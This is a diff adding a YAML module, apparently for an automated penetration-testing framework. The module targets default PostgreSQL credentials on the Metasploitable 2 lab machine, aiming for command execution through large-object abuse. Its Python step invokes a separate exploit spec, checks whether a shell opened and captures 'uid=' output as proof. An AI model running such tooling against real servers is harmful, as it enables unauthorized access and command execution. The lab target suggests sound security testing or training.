@@ -1,0 +1,34 @@
+name: MS2 PostgreSQL Default Creds RCE
+description: >
+  Default PostgreSQL credentials allow large-object abuse for command execution.
+  Delegates to the framework's verified exploit spec (exploits/ms2_postgres_default.yaml)
+  through run_spec, which drives the persistent target session.
+platforms:
+- linux
+scenario: metasploitable
+vector: ms2_postgres_default
+mitre: T1078
+trigger:
+- postgresql
+steps:
+- kind: lazymode
+  lang: python
+  timeout: 240
+  run: |
+    import re
+
+    from modules.atomic_exploit_bridge import load_all, run_spec
+
+    result = {"target": target, "vector": "ms2_postgres_default"}
+    spec = load_all().get("ms2_postgres_default")
+    if spec is None:
+        result["session_opened"] = False
+        result["error"] = "exploit spec ms2_postgres_default not found in exploits/"
+    else:
+        outcome = run_spec(spec, rhost=target)
+        blob = outcome.get("output") or ""
+        match = re.search(r"uid=\d+\([^)]*\)[^\n]*", blob)
+        result["cve"] = spec.cve
+        result["session_opened"] = bool(outcome.get("shell"))
+        result["success"] = bool(outcome.get("success"))
+        result["proof"] = (match.group(0).strip() if match else blob[-300:].strip()) or "(no proof)"
